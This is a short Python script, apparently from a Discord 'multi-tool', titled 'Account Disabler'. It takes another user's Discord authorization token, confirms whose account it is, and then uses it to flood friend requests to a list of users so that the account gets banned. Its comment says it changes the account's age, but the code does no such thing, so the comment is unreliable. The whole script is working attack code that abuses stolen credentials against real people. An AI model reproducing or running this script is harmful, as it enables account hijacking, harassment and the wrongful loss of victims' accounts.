import requests
import os
from util.plugins.common import * 

setTitle("Account Disabler")
clear()

def TokenDisable():
    #change their age to below 13 years old which is against tos which disables their account
    print(f"""Enter account token to disable""")
    token = str(input(f"""Token: """))
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"\nUser Details: {res['username']}#{res['discriminator']} - ({res['id']})")
    input(f"If These Details Are Correct Press Enter! (This Will Start Disbaling The Account, Use At Own Risk!)")
    print()
    for username in open('assets/users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print(f"\t{usr[0]}#{usr[1]} Added!")
        except:
            print(f"Something Went Wrong!")
    print(f"\n\nAccount successfully disabled")
    input(f"""\nPress enter to exit""")
    main()

TokenDisable()